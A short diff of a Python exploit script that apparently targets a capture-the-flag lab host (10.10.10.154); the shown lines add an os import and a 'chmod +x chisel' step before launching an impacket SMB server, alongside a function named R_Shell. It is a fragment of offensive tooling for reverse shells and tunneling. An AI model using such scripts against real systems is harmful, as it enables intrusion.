@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import requests, time, subprocess, atexit, threading, signal, sys, socket
+import requests, time, subprocess, atexit, threading, signal, sys, socket, os
 from impacket.smbserver import SimpleSMBServer
 
 main_url = "http://10.10.10.154"
@@ -188,6 +188,8 @@ def R_Shell():
 
 if __name__ == "__main__":
 
+	os.system("chmod +x chisel")	
+	
 	threading.Thread(target=smb_server, daemon=True).start()
 
 	ID = register()
